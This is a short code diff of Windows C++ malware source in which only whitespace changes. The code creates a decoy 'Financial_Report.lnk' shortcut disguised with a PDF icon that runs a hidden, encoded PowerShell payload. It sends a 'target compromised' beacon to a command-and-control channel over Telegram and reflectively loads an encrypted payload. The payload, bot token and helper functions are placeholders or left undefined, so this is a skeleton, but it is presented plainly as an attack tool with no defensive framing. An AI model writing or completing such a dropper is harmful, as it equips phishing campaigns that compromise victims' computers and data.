@@ -6,7 +6,7 @@
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     // initial security check
     SafetyProtocols::PreExecutionCheck();
-    
+
     // create decoy lnk file
     CreateWeaponizedLNK(
         L"Financial_Report.lnk",
@@ -14,16 +14,16 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         L"-w hidden -e your_payload(base64)",
         L"pdf.ico"
     );
-    
+
     // send beacon to C2
     if (TargetValidator::IsHighValueTarget()) {
         const char* data = "High-value target compromised!";
         TelegramSendEncrypted("BOT_TOKEN", "CHAT_ID", (BYTE*)data, strlen(data));
     }
-    
+
     // load main payload reflectively
     BYTE payload[] = { /* encrypted payload */ };
     ReflectiveLoad(payload, sizeof(payload));
-    
+
     return 0;
 }
